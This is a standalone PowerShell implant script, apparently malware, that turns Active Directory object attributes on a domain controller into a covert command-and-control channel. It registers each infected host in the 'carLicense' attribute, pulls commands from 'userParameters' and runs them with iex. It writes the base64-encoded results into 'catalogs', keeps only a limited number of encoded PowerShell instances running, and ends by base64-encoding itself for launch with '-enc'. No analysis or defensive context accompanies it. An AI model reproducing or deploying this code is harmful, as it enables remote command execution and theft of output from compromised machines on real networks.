$st='function ld([string]$d,[string]$i,[string]$o,[string]$t,[string]$l,[int]$m,[string]$p){$f=[adsi]"LDAP://DC_SERVER:389/$d";$v=$env:COMPUTERNAME.ToLower();try{$c = $f.InvokeGet($l);if($c -notmatch "$v"){$c+=";$v";$f.InvokeSet($l,$c);$f.SetInfo();}}catch{return};$r=$f.InvokeGet($t);if(($r -match $v) -or ($r -match "@llTh3c0mp5")){$z=$f.InvokeGet($i);if($z -eq $p){return $z;};$u=(iex $z) -join "`n";$u="<$v>`n$u`n</$v>`n";$y=$r -split ";";if(($y -ne $r) -and ($y[0] -ne $v)){$j=$y.IndexOf($v);if(($j -ge 0) -and $m){Start-Sleep -Milliseconds $m;};$b=[text.encoding]::Unicode.GetString([convert]::FromBase64String($f.InvokeGet($o)));$u=$b+$u;};$e=[convert]::ToBase64String([text.encoding]::Unicode.GetBytes($u));$f.InvokeSet($o,$e);$f.SetInfo();return $z;}else{return}};while(1){$a=((gwmi -Query "select commandline from win32_process where name=`"powershell.exe`"").commandline | ?{$_ -match "powershell.*-enc"}).count;if($a -ge 3){exit} else{if($a -eq 2){Start-Sleep 60}else{break}}};$z="init";while(1){$p=$z;$z=(ld -d "CN=COMPUTER_...." -i "userParameters" -o "catalogs" -t "mhsORaddress" -l "carLicense" -m 2000 -p $p) -join "";Start-Sleep -m 500}'


$q = [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($st))